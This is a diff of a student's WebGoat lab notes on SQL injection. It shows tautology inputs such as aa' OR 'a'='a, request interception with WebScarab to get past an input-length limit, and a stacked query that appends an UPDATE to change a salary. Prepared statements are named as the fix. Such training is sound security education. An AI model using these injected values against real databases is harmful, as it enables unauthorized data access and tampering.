@@ -5,7 +5,44 @@
 	SELECT * FROM user_data WHERE last_name = 'Smith' OR 'a' = 'a'
 	The input is Smith' OR 'a'='a, where the first single quote will complete the input name and the rest input and the last single quote will form a contion that holds true for every records. Thus all the record are displayed.
 3)How didi WebGoat fix the vulnerability?(Hint: See 'Show Java' tab)?
-	Using prepared statement.
+	Using prepared statements.
 4)Screenshots
 	String_SQL_inejction.png
 
+6. Lesson: LAB: SQL injection
+	Stage 1: String SQL injection
+	1)SQL statement used
+	SELECT * FROM employee WHERE userid = '112' and password = 'aa'
+	2)Modified SQL statement used for the SQL injection. How did it work?
+	SELECT * FROM employee WHERE userid = '112' and password = 'aa' OR 'a' = 'a'
+	We try to modify the input to be aa' OR 'a'='a, where the first single quote will complete the input name and the rest input and the last single quote will form a condition that holds true forever. But the website has a limitation of the length of my input. To overcome this, WebSacrab is used to intercept and change the request send to the server, thus we can do SQL injection finally. 
+	3)How didi WebGoat fix the vulnerability?(Hint: See 'Show Java' tab)?
+	Using prepared statements.
+	4)Screenshots
+	Stage1.png
+
+	Stage 2: Parameterized Query #1
+	Skipped due to the requirement of development version.
+
+	Stage 3: Numeric SQL injection
+	1)SQL statement used
+	SELECT * FROM employee WHERE userid = '101' and password = 'larry'
+	
+	2)Modified. How?
+	SELECT * FROM employee WHERE userid = '101' and password = 'larry' OR 'a'='a'
+
+	3)How fix?
+
+	4)Screenshots
+	Stage3_1.png, Stage3_2.png
+
+7. Lesson: Modify data with SQL injeciton
+	1)SQL used
+	SELECT userid, salary FROM employee WHERE userid = 'jsmith'
+	2)Modify. How work?
+	SELECT userid, salary FROM employee WHERE userid = 'jsmith'; UPDATE salaries SET salary=999999 WHERE userid='jsmith'
+	By using a ";" after the parameter, we can execture another SQL statement which can modify the data in the database.
+	3)How fix?
+	4)Screenshots
+	Modify.png
+	
